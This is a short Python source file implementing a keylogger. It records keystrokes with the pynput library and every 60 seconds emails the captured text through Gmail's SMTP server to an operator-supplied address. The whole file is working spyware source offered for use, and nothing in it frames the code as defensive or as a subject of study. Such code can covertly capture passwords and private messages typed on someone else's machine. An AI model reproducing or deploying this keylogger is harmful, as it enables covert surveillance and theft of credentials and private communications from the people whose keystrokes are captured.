import smtplib
import datetime
from pynput import mouse, keyboard
from threading import Timer



class Keylogger:
    def __init__(self, interval=300, send_logs=False):
        # Time interval for sending mails.
        self.interval = interval
        self.send_logs = send_logs
        # Used to store keystrokes captured from the device.
        self.logs = ''


    def handle_key_press(self, key):
        try:
            self.logs += key.char
        except AttributeError:
            if key == keyboard.Key.backspace:
                self.logs = self.logs[:-1]
            elif key == keyboard.Key.enter:
                self.logs += '[ENTER]\n' 
            elif key == keyboard.Key.space:
                self.logs += ' '
            else:
                pass


    def request_mail_credentials(self):
        self.email = input('Enter Email: ')
        self.password = input('Enter Password: ')


    def send_mail(self):
        # You can change your smtp server if you use a different mail
        smtpObj = smtplib.SMTP('smtp.gmail.com', 587)
        smtpObj.ehlo()
        smtpObj.starttls()
        try:
            smtpObj.login(self.email, self.password)
        except smtplib.SMTPAuthenticationError as err:
            print('An error occurred: ', err)

        log_date = datetime.datetime.now()
        msg = f'Subject: Log info\n {log_date}: {self.logs}'  
        smtpObj.sendmail('KeyLogger', self.email, msg)
        # End the smtp session
        smtpObj.quit()


    def report(self):
        if self.logs:
            self.send_mail()
        self.logs = ''
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()


    def start(self):
        if self.send_logs:
            self.request_mail_credentials()
        self.report()
        with keyboard.Listener(on_release=self.handle_key_press) as listener:
            listener.join()



if __name__ == '__main__':
    keylogger = Keylogger(60, True)
    keylogger.start()



